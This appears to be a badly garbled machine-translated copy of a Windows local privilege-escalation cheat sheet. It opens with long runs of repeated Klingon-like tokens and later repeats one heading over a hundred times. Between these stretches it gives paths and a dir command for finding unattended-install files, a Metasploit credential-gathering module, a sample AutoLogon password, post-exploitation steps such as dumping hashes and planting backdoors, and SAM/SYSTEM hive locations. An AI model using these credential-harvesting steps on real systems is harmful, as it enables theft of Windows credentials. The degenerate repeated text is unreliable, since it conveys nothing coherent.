QaStaHvIS 'e' vItlhutlh. jatlhpu' vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlh
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
# Windows Local Privilege Escalation

## Introduction

In this section, we will explore various techniques for escalating privileges on a Windows system. Privilege escalation is the process of gaining higher levels of access and control over a system than what is initially granted to a user. This can be achieved by exploiting vulnerabilities or misconfigurations in the system.

## Enumeration

Before attempting to escalate privileges, it is important to gather information about the target system. Enumeration involves identifying the operating system, installed software, and user accounts on the system. This information can be used to identify potential vulnerabilities and attack vectors.

### Enumerating Unattended Installation Files

Unattended installation files contain sensitive information, such as usernames and passwords, that can be used to escalate privileges. These files are typically used during the installation process to automate the setup of a Windows system.

To enumerate unattended installation files, you can use the `enum_unattend` module in Metasploit:

```
use post/windows/gather/enum_unattend
```

This module will search for unattended installation files on the target system and display any found files along with their contents.

## Exploitation

Once you have gathered information about the target system, you can proceed with exploiting vulnerabilities to escalate privileges. There are various techniques that can be used for privilege escalation, including:

- Exploiting misconfigured services or applications
- Exploiting weak file and folder permissions
- Exploiting vulnerable software versions
- Exploiting weak or default passwords

It is important to note that privilege escalation should only be performed on systems that you have permission to test. Unauthorized privilege escalation is illegal and unethical.

## Post-Exploitation

After successfully escalating privileges, you can perform various post-exploitation activities, such as:

- Dumping password hashes
- Accessing sensitive files and data
- Installing backdoors or persistence mechanisms
- Expanding access to other systems on the network

Post-exploitation activities should be performed carefully and with caution to avoid detection and maintain access to the compromised system.

## Conclusion

Windows local privilege escalation is a critical aspect of penetration testing and ethical hacking. By understanding the techniques and vulnerabilities involved in privilege escalation, you can effectively assess the security of Windows systems and recommend appropriate countermeasures. Remember to always obtain proper authorization before performing any hacking activities.
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol translation:

### SAM & SYSTEM backups

#### tlhIngan Hol
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Qa'legh Credentials

